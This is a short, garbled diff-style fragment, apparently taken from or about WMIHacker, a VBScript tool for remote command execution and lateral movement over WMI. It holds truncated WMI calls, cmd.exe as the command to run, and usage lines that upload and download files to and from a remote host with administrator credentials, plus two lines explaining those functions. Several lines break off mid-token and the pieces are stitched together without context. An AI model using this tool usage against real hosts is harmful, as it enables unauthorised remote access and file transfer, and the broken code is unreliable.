@@ -1,0 +1,11 @@
+	Set colItems = objWMIService.Exe
+        Set colItems = objWMIService.Exe
+    Dim oOutParams: Set oOutParams = oReg.Exe
+    Set colItems = objWMIService.Exe
+"	command = ""c:\windows\system32\cmd.exe"
+"    ""Action.Path = "" &chr(34)&""c:\windows\system32\cmd.exe"
+" cscript wmihacker_0.4.vbe /upload 172.16.94.187 administrator ""Password!"" ""c:\windows\system32\calc.exe"
+"hacker_0.4.vbe /download 172.16.94.187 administrator ""Password!"" ""c:\calc"" ""c:\windows\system32\calc.exe"
+File download: Download the remote host calc.exe to the local c:\calc.exe
+File upload: copy the local calc.exe to the remote host c:\calc.exe
+set colItems = objWMIService.Exe
